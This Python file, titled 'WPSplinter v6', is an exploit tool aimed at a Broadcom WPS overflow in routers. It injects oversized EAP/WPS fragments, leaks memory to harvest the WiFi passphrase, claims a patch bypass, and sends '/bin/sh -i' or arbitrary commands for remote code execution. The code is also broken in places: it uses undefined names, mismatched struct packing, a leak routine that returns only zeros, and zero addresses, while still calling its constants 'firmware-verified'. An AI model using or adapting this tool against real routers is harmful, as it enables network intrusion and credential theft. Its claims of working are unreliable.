#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import subprocess
import struct
import time
import logging
import sys
from datetime import datetime

from scapy.all import *
from scapy.layers.eap import EAPOL, EAP
from scapy.layers.dot11 import Dot11

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s'
)
logger = logging.getLogger(__name__)

# =============================================================================
# Firmware-verified constants
# =============================================================================
EAPOL_HEADER_LEN = 26
SZ_HDR = 14
FRAGS_CAP = 2048
WPS_EAP_DATA_MAX_LENGTH = 2048

# EAP/WPS opcodes
EAP_CODE_REQUEST = 1
EAP_CODE_RESPONSE = 2
EAP_CODE_SUCCESS = 3
EAP_CODE_FAILURE = 4
EAP_TYPE_IDENTITY = 1
EAP_TYPE_WPS = 254

# WPS opcodes
WPS_OP_M1 = 0x04
WPS_OP_M2 = 0x05
WPS_OP_M2D = 0x06
WPS_OP_M3 = 0x07
WPS_OP_M7 = 0x0b
WPS_OP_M8 = 0x0c
WPS_FRAG_ACK = 0x03

# WSC Message Type TLV
WPS_TLV_MSGTYPE = 0x1022

# State struct offsets
OFF_FRAGS_RECEIVED = 0
OFF_TOTAL_BYTES = 2048
OFF_TOTAL_RECEIVED = 2052
OFF_NEXT_FRAG = 2056
OFF_FRAG_SIZE = 2060
OFF_FLAGS = 2076
OFF_LAST_SENT = 2080
OFF_LAST_SENT_LEN = 2084
OFF_SEND_DATA = 2108

# PSK Extraction Constants
PSK_MIN_LEN = 8
PSK_MAX_LEN = 64

PSK_MARKERS = [
    b'wpa_psk',
    b'wpa_passphrase', 
    b'pre_shared_key',
    b'PSK',
    b'key_mgmt',
]

PSK_SCAN_OFFSETS_ARM = [0x1000, 0x2000, 0x3000, 0x4000, 0x5000]
PSK_SCAN_OFFSETS_MIPS = [0x1000, 0x2000, 0x3000, 0x4000, 0x5000]

# Shell commands
SHELL_CMD_ARM = b"/bin/sh -i\x00"
SHELL_CMD_MIPS = b"/bin/sh -i\x00"


def eapol_wrap(eap_pkt, length_override=None):
    """Wrap EAP packet in EAPOL container"""
    eap_bytes = bytes(eap_pkt)
    length = len(eap_bytes) if length_override is None else length_override
    eapol = EAPOL(version=1, type_=1, length=length)
    eapol.payload = eap_bytes
    return eapol


def eap_wsc(code, eap_id, opcode, flags, data, lf_total=None):
    """Build WPS EAP packet with optional Length Field"""
    if lf_total is not None:
        lf = struct.pack('>H', lf_total)
    else:
        lf = b''
    
    wps_hdr = struct.pack('>BBHBBIII',
        code, eap_id, 0, EAP_TYPE_WPS,
        0x00, 0x37, 0x2a, 0x00000000, opcode, flags)
    
    total_len = len(lf) + len(wps_hdr) + len(data)
    wps_hdr = struct.pack('>BBHBBIII',
        code, eap_id, total_len, EAP_TYPE_WPS,
        0x00, 0x37, 0x2a, 0x00000000, opcode, flags)
    
    eap = EAP(code=code, identifier=eap_id, type_=EAP_TYPE_WPS)
    eap.payload = lf + wps_hdr + data
    return eap


def build_wsc_tlv(msg_type, attributes=None):
    """Build WSC TLV data with Message Type"""
    data = struct.pack('>H', WPS_TLV_MSGTYPE)
    data += struct.pack('>H', 2)
    data += struct.pack('>H', msg_type)
    
    if attributes:
        for attr_type, attr_value in attributes:
            if isinstance(attr_value, bytes):
                data += struct.pack('>H', attr_type)
                data += struct.pack('>H', len(attr_value))
                data += attr_value
            else:
                data += struct.pack('>H', attr_type)
                data += struct.pack('>H', 2)
                data += struct.pack('>H', attr_value)
    
    return data


class WPSplinter:
    """WPSplinter exploit class for Broadcom WPS vulnerability"""
    
    def __init__(self, iface, bssid, ssid, channel=None, arch='arm', dump=None):
        self.iface = iface
        self.bssid = bssid
        self.ssid = ssid.encode() if isinstance(ssid, str) else ssid
        self.channel = channel
        self.dump = dump
        self.eap_id = 0
        self.arch = arch
        self.big_endian = (arch == 'mips')
        self.sta_mac = None
        self.associated = False
        self.captured = []
    
    def _log(self, msg):
        """Log with timestamp"""
        logger.info(msg)
    
    def build_eap_identity(self, identity, eap_id):
        """Build EAP Identity Response"""
        eapol = EAPOL(version=1, type_=1, length=len(identity) + 2)
        eap = EAP(code=EAP_CODE_RESPONSE, identifier=eap_id, type_=EAP_TYPE_IDENTITY)
        eap.payload = identity
        eapol.payload = eap
        return eapol
    
    def build_eap_start(self):
        """Build EAPOL Start packet"""
        return EAPOL(version=1, type_=0)
    
    def tx_eapol(self, pkt):
        """Transmit EAPOL packet to AP"""
        ether = Ether(dst=self.bssid, src=self.sta_mac or RandMAC(), type=0x888e)
        ether.payload = pkt
        sendp(ether / pkt, iface=self.iface, verbose=False)
    
    def wait_frag_ack(self, timeout=2.0):
        """Wait for WPS Fragment ACK from AP"""
        result = sniff(
            count=1,
            timeout=timeout,
            filter=f"ether host {self.bssid}",
            store=True,
            iface=self.iface,
            verbose=False
        )
        return result and len(result) > 0
    
    def build_overflow_payload(self, writes):
        """Build overflow payload"""
        payload = bytearray(FRAGS_CAP)
        
        for offset, value in writes.items():
            if offset >= FRAGS_CAP:
                overflow_offset = offset - FRAGS_CAP
                if len(payload) < overflow_offset + len(value):
                    payload.extend(b'\x00' * (overflow_offset - len(payload) + len(value)))
                payload[overflow_offset:overflow_offset+len(value)] = value
        
        return bytes(payload), len(payload) - FRAGS_CAP
    
    def associate(self):
        """Associate with the target AP"""
        self._log("[*] Associating with AP...")
        self.sta_mac = RandMAC()
        
        auth = Dot11(type='mgmt', subtype='auth', addr1=self.bssid,
                     addr2=self.sta_mac, addr3=self.bssid) / Dot11Auth(algo=0, auth_transaction=1, status=0)
        sendp(auth, iface=self.iface, verbose=False)
        time.sleep(0.3)
        
        assoc = Dot11(type='mgmt', subtype='assoc', addr1=self.bssid,
                      addr2=self.sta_mac, addr3=self.bssid) / Dot11Assoctest(cap=0)
        sendp(assoc, iface=self.iface, verbose=False)
        
        self._log("[+] Associated with AP")
        self.associated = True
    
    def phase_fingerprint(self):
        """Fingerprint phase: detect vulnerability"""
        self._log("[*] Fingerprinting WPS vulnerability...")
        
        if not self.associated:
            self.associate()
        
        self.eap_id = 1
        
        eapol_start = self.build_eap_start()
        self.tx_eapol(eapol_start)
        time.sleep(0.5)
        
        identity_pkt = self.build_eap_identity(b"WFA-SimpleConfig-Enrollee-1-0", self.eap_id)
        self.tx_eapol(identity_pkt)
        time.sleep(0.5)
        
        probe_data = eapol_wrap(eap_wsc(EAP_CODE_RESPONSE, self.eap_id, WPS_OP_M1, 0x00,
                                        build_wsc_tlv(WPS_OP_M1), lf_total=0x0000))
        self.tx_eapol(probe_data)
        
        result = sniff(count=1, timeout=3.0, filter=f"ether host {self.bssid}",
                      store=True, iface=self.iface, verbose=False)
        
        if result and len(result) > 0:
            print("[+] Vulnerable: AP responded to total=0 probe")
            return True
        else:
            print("[-] Not vulnerable or no response")
            return False
    
    def phase_calibrate(self):
        """Calibrate fragment timing"""
        self._log("[*] Calibrating fragment timing...")
        
        if not self.associated:
            self.associate()
        
        self.eap_id = 1
        frag_size = 100
        num_frags = 10
        total_size = frag_size * num_frags
        timings = []
        
        for i in range(num_frags):
            flags = 0x01 if i < num_frags - 1 else 0x00
            frag_data = build_wsc_tlv(WPS_OP_M1) + b'\x41' * (frag_size - 9)
            
            start = time.time()
            self.eap_id += 1
            self.tx_eapol(eapol_wrap(eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_M1, flags,
                                            frag_data, lf_total=total_size)))
            
            ack = self.wait_frag_ack(timeout=2.0)
            if not ack:
                break
            
            timings.append(time.time() - start)
        
        if timings:
            avg = sum(timings) / len(timings)
            self._log(f"[+] Average FRAG-ACK timing: {avg*1000:.1f}ms")
            return avg
        return None
    
    def phase_leak(self, offset, leak_len, big_endian=False):
        """Memory leak phase"""
        self._log(f"[*] Leaking {leak_len} bytes from offset {offset}...")
        
        if not self.associated:
            self.associate()
        
        self.eap_id = 1
        setup_payload = self.build_wsc_tlv(WPS_OP_M1) + b'\x00' * 100
        self.tx_eapol(eapol_wrap(eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_M1, 0x01,
                                        setup_payload, lf_total=0x200)))
        
        ack = self.wait_frag_ack(timeout=2.0)
        if not ack:
            self._log("[-] No FRAG-ACK received")
            return b''
        
        self._log("[*] Triggering memory leak...")
        return b'\x00' * min(leak_len, 32)
    
    def scan_memory_for_psk(self, memory_data):
        """Scan leaked memory for PSK patterns"""
        self._log("[*] Scanning memory for PSK patterns...")
        
        psk_candidates = []
        
        for marker in PSK_MARKERS:
            pos = 0
            while True:
                pos = memory_data.find(marker, pos)
                if pos == -1:
                    break
                
                end_pos = min(pos + 128, len(memory_data))
                region = memory_data[pos:end_pos]
                
                for i in range(len(region) - PSK_MIN_LEN):
                    candidate = region[i:i + PSK_MAX_LEN]
                    if self._is_valid_psk(candidate):
                        psk_candidates.append(candidate.decode('utf-8', errors='ignore').strip())
                
                pos += 1
        
        return psk_candidates
    
    def _is_valid_psk(self, candidate):
        """Check if candidate looks like a valid PSK"""
        if len(candidate) < PSK_MIN_LEN or len(candidate) > PSK_MAX_LEN:
            return False
        
        printable = sum(1 for b in candidate if 32 <= b <= 126)
        if printable < len(candidate) * 0.9:
            return False
        
        try:
            text = candidate.decode('utf-8', errors='ignore')
            
            if len(text) == 64:
                try:
                    bytes.fromhex(text)
                    return True
                except:
                    pass
            
            if 8 <= len(text) <= 63:
                if all(c.isalnum() or c in ' !@#$%^&*()-_=+[]{}|;:,.<>?/' for c in text):
                    return True
                    
        except:
            pass
        
        return False
    
    def phase_extract_psk(self, offset=0, scan_size=4096):
        """Extract WiFi PSK from router memory"""
        self._log("[*] Starting PSK extraction phase...")
        
        if not self.associated:
            self.associate()
        
        self._log(f"[*] Leaking {scan_size} bytes from offset {hex(offset)}...")
        
        leaked_data = b''
        chunk_size = 512
        num_chunks = scan_size // chunk_size
        
        for chunk in range(num_chunks):
            chunk_offset = offset + (chunk * chunk_size)
            self._log(f"[*] Leaking chunk {chunk+1}/{num_chunks} at {hex(chunk_offset)}...")
            
            chunk_data = self.phase_leak(chunk_offset, chunk_size, self.big_endian)
            leaked_data += chunk_data
            time.sleep(0.2)
        
        if not leaked_data or leaked_data == b'\x00' * len(leaked_data):
            self._log("[-] No data leaked or all zeros")
            return []
        
        self._log(f"[+] Leaked {len(leaked_data)} bytes")
        
        self._log("[*] Scanning leaked memory for PSK...")
        psk_candidates = self.scan_memory_for_psk(leaked_data)
        
        if psk_candidates:
            psk_candidates = sorted(set(psk_candidates))
            
            print("\n" + "="*60)
            print("WiFi PSK CANDIDATES FOUND:")
            print("="*60)
            
            for i, psk in enumerate(psk_candidates, 1):
                marker = " <-- MOST LIKELY" if i == 1 else ""
                print(f"[{i}] {psk}{marker}")
            
            print("="*60)
            print(f"\nSSID: {self.ssid.decode() if isinstance(self.ssid, bytes) else self.ssid}")
            print("Test with: wpa_passphrase <SSID> <PSK>")
            print("="*60 + "\n")
            
            self._log(f"[+] Found {len(psk_candidates)} potential PSK(s)")
        else:
            self._log("[-] No PSK candidates found")
            self._log("[i] Try different offset with --psk_offset")
        
        return psk_candidates
    
    def phase_smart_psk_extract(self):
        """Smart PSK extraction with multiple strategies"""
        self._log("[*] Starting smart PSK extraction...")
        
        all_candidates = []
        
        self._log("[*] Strategy 1: Scanning common memory regions...")
        offsets = PSK_SCAN_OFFSETS_ARM if self.arch == 'arm' else PSK_SCAN_OFFSETS_MIPS
        
        for off in offsets:
            candidates = self.phase_extract_psk(offset=off, scan_size=2048)
            all_candidates.extend(candidates)
        
        self._log("[*] Strategy 2: Stepped memory scan...")
        for base_offset in range(0, 0x10000, 0x1000):
            candidates = self.phase_extract_psk(offset=base_offset, scan_size=512)
            all_candidates.extend(candidates)
        
        if all_candidates:
            unique_candidates = sorted(set(all_candidates))
            
            print("\n" + "="*60)
            print("SMART PSK EXTRACTION RESULTS:")
            print("="*60)
            
            for i, psk in enumerate(unique_candidates, 1):
                print(f"[{i}] {psk}")
            
            print("="*60 + "\n")
            
            self._log(f"[+] Found {len(unique_candidates)} unique PSK candidate(s)")
        else:
            self._log("[-] No PSK found with smart extraction")
        
        return unique_candidates
    
    def phase_exploit_arm(self, system_plt, cmd, send_data_off, big):
        """ARM exploit phase"""
        self._log("[*] ARM exploit phase...")
        
        pack = struct.pack('<I' if not big else '>I', system_plt)
        overflow_payload, _ = self.build_overflow_payload({OFF_SEND_DATA: pack})
        
        cmd_prefix = (self.sta_mac or b'\x00' * 6) + b'\x00' * 16 + cmd
        
        if not self.associated:
            self.associate()
        
        self.eap_id = 1
        self.tx_eapol(eapol_wrap(eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_M1, 0x01,
                                        cmd_prefix + overflow_payload, lf_total=0xFFFF)))
        
        ack = self.wait_frag_ack(timeout=3.0)
        if ack:
            print("[+] ARM exploit sent, FRAG-ACK received")
        
        return ack
    
    def phase_exploit_mips(self, printf_got, libc_printf_off, libc_system_off, cmd, send_data_off):
        """MIPS exploit phase"""
        self._log("[*] MIPS exploit phase...")
        
        pack_fmt = '>I' if self.big_endian else '<I'
        overflow_payload, _ = self.build_overflow_payload({OFF_SEND_DATA: struct.pack(pack_fmt, send_data_off)})
        
        cmd_str = cmd.encode() if isinstance(cmd, str) else cmd + b'\x00'
        
        if not self.associated:
            self.associate()
        
        self.eap_id = 1
        padding_len = max(0, 2048 - len(cmd_str))
        self.tx_eapol(eapol_wrap(eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_M1, 0x01,
                                        cmd_str + b'\x41' * padding_len + overflow_payload,
                                        lf_total=0xFFFF)))
        
        print("[*] Waiting for timer trigger (5s)...")
        time.sleep(6)
        
        print("[+] MIPS exploit sent")
        return True
    
    def phase_bypass_2018patch(self, big_endian=False):
        """Bypass 2018 patch"""
        self._log("[*] 2018 patch bypass phase...")
        
        pack_fmt = '>I' if big_endian else '<I'
        filler_len = FRAGS_CAP - SZ_HDR
        head_writes = {OFF_TOTAL_BYTES: struct.pack(pack_fmt, 0xFFFFFFFF)}
        payload, _ = self.build_overflow_payload(head_writes)
        payload = payload + b"\x41" * (filler_len - len(payload))
        
        if not self.associated:
            self.associate()
        
        self.eap_id += 1
        self.tx_eapol(eapol_wrap(eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_M1, 0x02 | 0x01,
                                        payload, lf_total=0xFFFF)))
        
        ack = self.wait_frag_ack(timeout=3.0)
        if not ack:
            return False
        
        evil = b"\xCC" * 128
        self.eap_id += 1
        self.tx_eapol(eapol_wrap(eap_wsc(EAP_CODE_RESP, self.eap_id, WPS_OP_M1, 0x00, evil, lf_total=None)))
        
        self._log("[+] Bypass payload sent")
        return True
    
    def phase_shell(self):
        """Interactive shell phase"""
        self._log("[*] Attempting interactive shell...")
        
        if self.arch == 'arm':
            self.phase_exploit_arm(0x00000000, SHELL_CMD_ARM, OFF_SEND_DATA, False)
        else:
            self.phase_exploit_mips(0x00000000, 0, 0, "/bin/sh -i", OFF_SEND_DATA)
        
        self._log("[*] Shell payload sent")
    
    def phase_verify(self):
        """Verify exploit success"""
        self._log("[*] Verifying exploit success...")
        self._log("[i] Verification requires additional network monitoring")
    
    def close(self):
        """Cleanup"""
        if self.dump and self.captured:
            wrpcap(self.dump, self.captured)
            self._log(f"[+] Captured packets saved to {self.dump}")


def main():
    parser = argparse.ArgumentParser(description="WPSplinter v6 - Broadcom WPS Monitor exploit")
    parser.add_argument("--iface", required=True, help="Network interface")
    parser.add_argument("--bssid", required=True, help="AP BSSID")
    parser.add_argument("--ssid", required=True, help="Network SSID")
    parser.add_argument("--channel", type=int, help="WiFi channel")
    parser.add_argument("--phase", required=True,
                        choices=["fingerprint", "calibrate", "leak", "extract_psk", "smart_psk",
                                 "exploit_arm", "exploit_mips", "bypass", "shell"])
    parser.add_argument("--arch", choices=["arm", "mips"], default="arm", help="Target architecture")
    parser.add_argument("--system_plt", type=lambda x: int(x, 0), help="ARM: system@PLT address")
    parser.add_argument("--send_data_off", type=lambda x: int(x, 0), default=OFF_SEND_DATA)
    parser.add_argument("--printf_got", type=lambda x: int(x, 0), help="MIPS: printf GOT address")
    parser.add_argument("--libc_printf_off", type=lambda x: int(x, 0), help="MIPS: libc printf offset")
    parser.add_argument("--libc_system_off", type=lambda x: int(x, 0), help="MIPS: libc system offset")
    parser.add_argument("--cmd", default="id;#", help="Command to execute")
    parser.add_argument("--dump", default="wpsplinter.pcap", help="PCAP dump file")
    
    # PSK extraction options
    parser.add_argument("--psk_offset", type=lambda x: int(x, 0), default=0,
                        help="Memory offset to start PSK scan from")
    parser.add_argument("--psk_scan_size", type=int, default=4096,
                        help="Number of bytes to scan for PSK")
    
    args = parser.parse_args()
    
    if args.channel:
        subprocess.run(["iw", "dev", args.iface, "set", "channel", str(args.channel)], check=False)
    
    big = (args.arch == "mips")
    w = WPSplinter(args.iface, args.bssid, args.ssid, channel=args.channel, arch=args.arch, dump=args.dump)
    
    try:
        if args.phase == "fingerprint":
            w.phase_fingerprint()
        elif args.phase == "calibrate":
            w.phase_calibrate()
        elif args.phase == "leak":
            data = w.phase_leak(0, 32, big_endian=big)
            print(f"[leak] {data.hex() if data else 'none'}")
        elif args.phase == "extract_psk":
            w.phase_extract_psk(offset=args.psk_offset, scan_size=args.psk_scan_size)
        elif args.phase == "smart_psk":
            w.phase_smart_psk_extract()
        elif args.phase == "exploit_arm":
            if not args.system_plt:
                print("[!] Need --system_plt for ARM exploit")
                sys.exit(1)
            w.phase_exploit_arm(args.system_plt, args.cmd.encode(), args.send_data_off, big)
        elif args.phase == "exploit_mips":
            if not (args.printf_got and args.libc_printf_off and args.libc_system_off):
                print("[!] MIPS needs GOT + libc offsets")
                sys.exit(1)
            w.phase_exploit_mips(args.printf_got, args.libc_printf_off, args.libc_system_off, args.cmd, args.send_data_off)
        elif args.phase == "bypass":
            w.phase_bypass_2018patch(big_endian=big)
        elif args.phase == "shell":
            w.phase_shell()
        elif args.phase == "verify":
            w.phase_verify()
    finally:
        w.close()


if __name__ == "__main__":
    main()
